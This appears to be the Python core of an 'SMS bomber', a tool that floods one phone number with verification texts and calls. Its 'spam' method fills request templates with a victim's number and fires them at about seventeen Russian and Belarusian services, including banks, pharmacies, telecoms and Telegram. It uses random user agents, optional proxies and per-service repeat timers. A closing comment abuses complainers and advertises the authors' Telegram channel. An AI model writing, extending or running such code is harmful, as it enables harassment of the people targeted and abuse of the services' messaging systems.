import json
import time
import requests
from fake_useragent import UserAgent

services_list = ["apteka.ru", "magnit", "telegram", "citi_link", "akbarsa", "yota", "b_apteka", "mir", "pochtabank", 'mt_free', "megafon.tv", "moezdorovie", "totopizza", "zdesapteka", "stockmann", "SberUslugi", "victoria"]

class Send:
    def __init__(self):
        self.service = None
        self.service_data = None
        self.services = None
        self.cookie = {'yota': 'https://tv.yota.ru/', 'megafon.tv': 'https://megafon.tv/', "zdesapteka": "https://zdesapteka.ru/"}
        self.response_services = {'apteka.ru': 200, 'magnit': "json", 'telegram': 200, 'citi_link': 200, 'akbarsa': 200, 'yota': 201, 'b_apteka': 200, 'mir': 200, 'pochtabank': 200, 'mt_free': "json", "megafon.tv": 201, "moezdorovie": 200, "totopizza": 200, "zdesapteka": 200, "stockmann": 200, "SberUslugi": 200, "victoria": 200}
        self.time_out_ = {'apteka.ru': 0, 'magnit': 0, 'telegram': 0, 'citi_link': 0, 'akbarsa': 0, 'yota': 0, 'b_apteka': 0, 'mir': 0, 'pochtabank': 0, 'mt_free': 0, "megafon.tv": 0, "moezdorovie": 0, "totopizza": 0, "zdesapteka": 0, "stockmann": 0, "SberUslugi": 0, "victoria": 0}
        self.time_out_config = {'apteka.ru': 120, 'magnit': 120, 'telegram': 120, 'citi_link': 60, 'akbarsa': 60, 'yota': 60, 'b_apteka': 60, 'mir': 60, 'pochtabank': 120, 'mt_free': 185, "megafon.tv": 600, "moezdorovie": 300, "totopizza": 65, "zdesapteka": 65, "stockmann": 600, "SberUslugi": 180, "victoria": 65}
        self.default_headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				                'Accept-Encoding': 'gzip, deflate, br',
				                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
				                'Cache-Control': 'no-cache',
				                'Connection': 'keep-alive',
				                'User-Agent': None}

    def checktimeout(self, service):
        time_out_ = self.time_out_
        time_out_config = self.time_out_config
        if time_out_[service] == 0:
            time_out_[service] = time.time()
            return True
        else:
            old_time = time_out_[service]
            now_time = time.time()
            try:
                if now_time - old_time >= time_out_config[service]:
                    time_out_[service] = time.time()
                    return True
                else:
                    return False
            except:
                print('error: что-то пошло не так (возможно в конфиге нету нужного сервиса)')
                return False

    def json_parse(self, payload, datatype, country, phone):
        # Форматирование для России
        if country == 'ru':
            for old, new in {
                "'": '"',
                "*+phone*": phone[0],
                "*phone*": phone[1],
                "*phone8*": phone[2],
                "*phone()*": phone[3],
                "*phone2*": phone[4],
                "*phone3*": phone[5],
                "*mtfree*": phone[6],
                "*-phone*": phone[7]
            }.items():
                if old in payload:
                    payload = payload.replace(old, new)
            return datatype, payload
        # Форматирование для Беларуси
        elif country == 'by':
            for old, new in {
                "'": '"',
                "*+phone*": phone[0],
                "*phone*": phone[1],
                "*-phone*": phone[2]
            }.items():
                if old in payload:
                    payload = payload.replace(old, new)
            return datatype, payload

    # Обработка json для последующего спама
    def json_processing(self, phone):
        # Проверка страны
        if phone[1][:1] == '3':
            country = "by"
        else:
            country = "ru"

        # Загрузка json
        with open('tools/services.json') as f:
            services = json.load(f)
        # Получение сервисов по стране
        self.services = services[country][0]
        try:
            service = self.services[self.service]
        except: # Если нужного сервиса не оказалось в json
            return False, False
        self.service_data = service

        if "json" in service: # Если данные для запроса json
            payload = service["json"]
            datatype = 'json'
        elif "data" in service: # Если данные для запроса data
            payload = service["data"]
            datatype = 'data'
        else:
            return self.json_parse(service["url"], "url", country, phone)

        payload, datatype = self.json_parse(payload, datatype, country, phone)

        # Проверка, нужно ли менять url
        if '*' in service["url"]:
            data = [True, (self.json_parse(service["url"], "url", country, phone)), (payload, datatype)] # (True(с изменениями в url) or False, (payload, "url") - в случае True, (payload, "json or data"))
            return data
        else:
            data = [False, (payload, datatype)]
            return data


    # Функция для спама
    def spam(self, service, phone, proxy=None):
        self.service = service

        payloadUrl = ''
        if self.json_processing(phone) != False:
            try:
                if self.json_processing(phone)[0] == True:
                    payloadUrl = self.json_processing(phone)[1][1]
                    datatype, payload = self.json_processing(phone)[2]
                else:
                    datatype, payload = self.json_processing(phone)[1]
            except: # Если передается только url
                datatype = "url"
                payloadUrl = self.json_processing(phone)[1]
        else: # Если сервиса нет в json
            return False, False

        # Дата сервиса
        service = self.service_data
        if payloadUrl != '':
            url = payloadUrl
        else:
            url = service["url"]

        # Генерируем headers
        ua = UserAgent().random
        try:
            service["headers"]["User-Agent"] = ua # Здесь мы берем хедерсы с json, если конечно они там есть, иначе используем дефолтные
            headers = service["headers"]
        except:
            headers = self.default_headers
            headers['User-Agent'] = ua

        session = requests.Session()

        # Получаем куки сайта (если нужны)
        cookies = None
        if self.service in self.cookie:
            cookies = session.get(self.cookie[self.service], headers=headers).cookies

        # В зависимости от типа входных данных, добавляем их в запрос
        json_ = None
        data = None
        if datatype == "json":
            json_ = json.loads(payload)
        elif datatype == "data":
            data = json.loads(payload)
        elif self.service == "victoria": # для инвалида
            json_ = {"parameter": "{\"MobilePhone\":\"" + phone[0] + "\",\"CardNumber\":null,\"AgreeToTerms\":1,\"AllowNotification\":1}"}

        # Отправляем запрос
        try:
            if self.service == 'pochtabank': # для инвалидов
                session.post('https://my.pochtabank.ru/dbo/registrationService/ib')
                r = session.put(url, json=json_, timeout=10, proxies=proxy)
            elif self.service == "zdesapteka":
                ses_id = cookies["PHPSESSID"]
                data['sessid'] = ses_id
                r = session.post(url, data=data, timeout=10, proxies=proxy, cookies=cookies, headers=headers)
            elif self.service == "stockmann":
                r = requests.get(url, timeout=10, proxies=proxy, headers=headers)
            else:
                r = session.post(url, json=json_, data=data, timeout=10, proxies=proxy, cookies=cookies, headers=headers)
            if self.response_services[self.service] == "json":
                return r.status_code, r.json()
            else:
                if r.status_code == self.response_services[self.service]:
                    return 200, r.text
                else:
                    return r.status_code, r.text
        except:
            return False, False # Не нравиться? Иди нахуй предъяви нам, а нас ты сможешь найти только в нашем телеграм
                                # канале, подписывайся и пиши нам свои жалобы личинус ебаный - https://t.me/orion_bomber
